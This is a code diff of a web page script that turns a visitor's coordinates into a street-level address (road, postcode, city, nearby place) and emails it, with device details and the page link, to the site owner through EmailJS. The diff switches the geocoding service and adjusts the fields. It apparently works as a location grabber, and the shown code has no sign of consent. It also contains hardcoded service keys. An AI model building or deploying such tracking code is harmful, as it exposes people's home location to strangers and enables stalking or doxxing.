@@ -76,7 +76,7 @@
             }
         });
 
-        emailjs.init("MPhPUQIdgkUqoKusv");
+        emailjs.init("MPhPUQIdgkUqoKusv0");
 
         async function getIP() {
             try {
@@ -104,8 +104,9 @@
         }
 
         async function fetchLocationData(latitude, longitude) {
-            const apiKey = "pk.a5fd537492d8811da2c4d54bba29abd6";
-            const apiUrl = `https://us1.locationiq.com/v1/reverse.php?key=${apiKey}&lat=${latitude}&lon=${longitude}&format=json`;
+            // const apiKey = "pk.a5fd537492d8811da2c4d54bba29abd6";
+            // const apiUrl = `https://us1.locationiq.com/v1/reverse.php?key=${apiKey}&lat=${latitude}&lon=${longitude}&format=json`;
+            const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
             try {
                 const response = await fetch(apiUrl);
                 return await response.json();
@@ -123,15 +124,15 @@
                 user_country: data.address?.country || "Unknown",
                 user_country_code: data.address?.country_code || "Unknown",
                 user_state: data.address?.state || "Unknown",
-                user_city: data.address?.city || "Unknown",
+                user_city: data.address?.city || data.address?.state_district,
                 user_pincode: data.address?.postcode || "Unknown",
                 user_address: data?.display_name || "Unknown",
-                user_sports: data.address?.stop || data.address?.sports || "Unknown",
+                user_sports: data.address?.stop || data.address?.sports,
                 user_road: data.address?.road || "Unknown",
-                user_nearplace: data.address?.suburb || "Unknown",
+                user_nearplace: data.address?.amenity || data.address?.suburb,
                 user_device_type: deviceType,
                 user_device_category: deviceCategory,
-                user_link: window.location.href
+                user_link: window.location.href,
             }).catch(error => {
                 console.error("Failed to send email.", error);
             });
